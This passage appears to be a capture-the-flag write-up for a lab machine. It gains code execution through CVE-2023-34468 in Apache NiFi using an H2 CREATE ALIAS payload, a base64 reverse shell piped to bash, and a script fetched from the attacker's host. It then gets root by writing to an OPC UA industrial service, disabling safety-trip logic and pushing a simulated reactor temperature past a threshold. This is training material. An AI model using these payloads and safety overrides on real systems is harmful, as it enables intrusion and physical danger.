## Exploitation

`flow.helix.htb` hosts an **Apache NiFi 1.21.0** control panel, vulnerable to **CVE-2023-34468** (unauthenticated RCE via a malicious DBCPConnectionPool controller service).

![NiFi panel](/assets/img/posts/helix/nifi-panel.png)

### Step 1 — Malicious controller service

Create a `DBCPConnectionPool` controller service with the following properties:

| Property | Value |
|---|---|
| Database Connection URL | `jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;` |
| Database Driver Class | `org.h2.Driver` |
| Database Driver Location | `work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar` |

![DBCPConnectionPool config](/assets/img/posts/helix/dbcp-config.png)

### Step 2 — RCE payload

The embedded H2 driver supports `CREATE ALIAS`, which lets us define a Java function that shells out to `bash`:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('echo <base64-reverse-shell> | base64 -d | /bin/bash');
```

We point the existing `ExecuteSQL` processor's Select Query at a script hosted on our machine:

```sql
RUNSCRIPT FROM 'http://10.10.15.154:8000/init.sql'
```

`operator` can run a single binary as root, no password required. Trying it directly is not enough:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

### Reading helix-maint-console

```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

SCOPE="helix-maint-$$"

systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

exit 0
```

The gate is `window_ok`: it reads a Unix timestamp from `/opt/helix/state/maintenance_window` and only proceeds if that timestamp is still in the future. `operator` cannot write that file directly:

```bash
operator@helix:~$ cat /opt/helix/state/maintenance_window
cat: /opt/helix/state/maintenance_window: Permission denied
```

So the script itself is not the vulnerability — sudo already hands us a root-owned bash the moment the flag file says so. The real question is: **what writes that file, and can we influence it?**

### Finding the maintenance mechanism

`operator`'s home directory contains an operator guide and a diagram:

```bash

'Operator Control & Safety Guide.pdf'
```


![Control diagram](/assets/img/posts/helix/control-diagram.png)

The documentation describes an internal **OPC UA** service on port `4840`, used to expose industrial process variables (temperature, pressure, safety interlocks) for a simulated reactor. `ss -ltnp` confirms it:

```
LISTEN         0              100                             127.0.0.1:4840                       0.0.0.0:*
```

Bound to loopback only — we forward it over the existing SSH session:

```bash
ssh -L 4840:127.0.0.1:4840 -i operator.key operator@helix.htb
```

### Enumerating the OPC UA namespace

Using the `opcua` Python library, we walk the node tree and collect the relevant variables:

| Node | NodeId |
|---|---|
| Mode | `ns=2;i=12` |
| TestOverride | `ns=2;i=13` |
| CalibrationOffset | `ns=2;i=6` |
| Temperature | `ns=2;i=4` |

`Mode` and `TestOverride` are writable. `Temperature` is read-only, but `CalibrationOffset` is writable and clearly feeds into how `Temperature` is computed — this is our indirect lever to satisfy the condition that opens the maintenance window.

### Driving Temperature past the threshold

`CalibrationOffset` doesn't map linearly (or instantly) onto `Temperature` — the value updates in discrete steps, suggesting the backend runs on its own tick rather than recomputing on every write. We increase the offset gradually and poll the resulting temperature until it clears **295°C**:

```python
from opcua import Client
import time

client = Client("opc.tcp://127.0.0.1:4840")

try:
    client.connect()

    mode_node = client.get_node("ns=2;i=12")
    override_node = client.get_node("ns=2;i=13")
    calibration_node = client.get_node("ns=2;i=6")
    temp_node = client.get_node("ns=2;i=4")

    # Set maintenance mode
    mode_node.set_value("MAINTENANCE")
    print("Mode set to:", mode_node.get_value())

    # Enable test override (bypasses the safety-trip logic)
    override_node.set_value(True)
    print("TestOverride set to:", override_node.get_value())

    # Increase calibration offset gradually, using Temperature as feedback
    calibrations = [0.0, 2.5, 5.0, 7.5, 10.0, 12.5, 15.0, 17.5, 20.0]

    for value in calibrations:
        calibration_node.set_value(value)
        print(f"CalibrationOffset set to: {value}")

        temperature = temp_node.get_value()
        print(f"Current Temperature: {temperature}")

        if temperature >= 295:
            print("[+] Maintenance window reached")
            break

        time.sleep(1)

finally:
    client.disconnect()
```
